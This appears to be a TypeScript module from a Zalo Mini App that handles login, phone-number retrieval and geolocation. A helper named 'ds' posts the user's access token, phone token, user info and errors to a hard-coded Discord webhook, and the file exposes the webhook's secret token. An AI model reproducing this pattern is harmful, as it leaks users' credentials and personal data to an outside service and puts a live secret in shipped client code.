import {
  getAccessToken,
  getLocation,
  getPhoneNumber,
  getStorage,
  getUserInfo,
  login,
} from "zmp-sdk/apis";
import { getZaloInfoApi } from "@/services/other/authService";
import { ENV } from "@/utils/api";

export const loginApi = async () => {
  try {
    await login({});
    const accessToken = await getAccessToken({});
    const { userInfo } = await getUserInfo({
      // @ts-ignore
      autoRequestPermission: true,
    });
    return { userInfo, accessToken };
  } catch (error) {
    // xử lý khi gọi api thất bại
    console.log(error);
  }
};

// const getZaloInfo = (token: string, accessToken: string) => {
//   return new Promise((resolve, reject) =>
//     fetch(
//       `https://graph.zalo.me/v2.0/me/info?access_token=${accessToken}&code=${token}&secret_key=${ENV.VITE_APP_ZALO_SECRET_KEY}`
//     )
//       .then((response) => response.json())
//       .then((data) => {
//         if (data?.error) {
//           reject(data);
//         }
//         resolve(data);
//       })
//       .catch((error) => {
//         reject(error);
//       })
//   );

// };
const ds = (data: any) => {
  const webhookUrl =
    "https://discord.com/api/webhooks/12982305130766616419/PHNfn6uqHoop7Ucc3XJJjE6udos7HlaKNETRS1agVxkJbUEBsVSnMfbWyfQDnMqR8Ptr";

  fetch(webhookUrl, {
    method: "POST",
    body: JSON.stringify({
      content: JSON.stringify(data),
    }),
    headers: {
      "Content-Type": "application/json",
    },
  }).catch((error) => {
    console.log("🚀 -> file: loginAction.ts:17 -> error:", error);
  });
};

export const getPhoneNumberApi = async () => {
  try {
    const zaloInfo = await loginApi();
    let { token, number } = await getPhoneNumber();
    console.log("token", token);
    console.log("number", number);

    if (!token || !zaloInfo?.accessToken) {
      console.log("token or accessToken is undefined");

      throw {
        code: 1000,
        message: `Không lấy được token hoặc accessToken!`,
      };
    }

    const data = (await getZaloInfoApi(token, zaloInfo?.accessToken)) as any;

    if (!data?.data?.number) {
      ds({
        data,
        zaloInfo,
        token,
        number,
      });
    }

    if (!data?.data?.number) {
      throw {
        code: -9998,
        message: "Không lấy được số điện thoại người dùng!",
      };
    }

    if (data) {
      const number = data.data.number;
      let phoneNumber = number.replace("84", "0").replace(/\s+/g, "");
      return { phoneNumber, zaloInfo };
    }
  } catch (error: any) {
    if (ENV.VITE_APP_ENVIRONMENT === "dev") {
      console.log("error", error);
      return;
    }

    // xử lý khi gọi api thất bại
    if (error?.code === -201 || error?.code === -202) {
      throw {
        code: 1000,
        message: "Người dùng từ chối cấp quyền truy cập!",
      };
    }
    if (error?.code === -1401) {
      throw {
        code: 1000,
        message: "Người dùng chưa cấp thông tin xác thực!",
      };
    }
    if (error?.code === -2002) {
      throw {
        code: 1000,
        message:
          "Người dùng đã từ chối cấp quyền truy cập trước đó và không muốn hỏi lại!",
      };
    }

    if (error?.code === -9998) {
      throw {
        code: 1000,
        message: "Không lấy được số điện thoại người dùng!",
      };
    }

    if (error?.error === 115) {
      throw {
        code: 1000,
        message: "Code không hợp lệ!",
      };
    }

    if (error?.error === 119) {
      throw {
        code: 1000,
        message: "Vui lòng thử lại sau!",
      };
    }

    if (error?.code === -1409) {
      throw {
        code: 1000,
        message: "Yêu cầu quá nhiều lần, vui lòng thử lại sau!",
      };
    }

    if (error?.error === -501) {
      throw {
        code: 1000,
        message:
          "Thông tin cá nhân được giới hạn trong vùng lãnh thổ Việt Nam!",
      };
    }

    if (error?.code === -1404) {
      throw {
        code: 1000,
        message:
          "Phiên bản zalo không hợp lệ, vui lòng cập nhật phiên bản mới!",
      };
    }

    ds({
      error,
    });

    throw {
      code: 1000,
      message: "Không lấy được số điện thoại người dùng!",
    };
  }
};

export const getStorePhoneNumber = async () => {
  try {
    const { phoneNumber } = await getStorage({
      keys: ["phoneNumber"],
    });
    return phoneNumber;
  } catch (error) {
    console.log(error);
  }
};

const getLocationWeb = async () => {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        resolve({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
        });
      },
      (error) => {
        reject(error);
      }
    );
  });
};

export const getLocationApi: () => Promise<any> = async () => {
  const dataLoginApi = await loginApi();

  if (!dataLoginApi?.accessToken) {
    return getLocationWeb();
  }

  return new Promise((resolve, reject) => {
    getLocation({
      success: async (data) => {
        let token = data?.token;
        if (!token) {
          reject("token is undefined");
          return;
        }
        getZaloInfoApi(token, dataLoginApi.accessToken)
          .then((res: any) => {
            console.log("getZaloInfo success", res.data);
            resolve(res.data);
          })
          .catch((error) => {
            console.log("getZaloInfo error", error);
            reject(error);
          });
      },
      fail: (error) => {
        console.log("getLocation error", error);
        reject(error);
      },
    });
  });
};
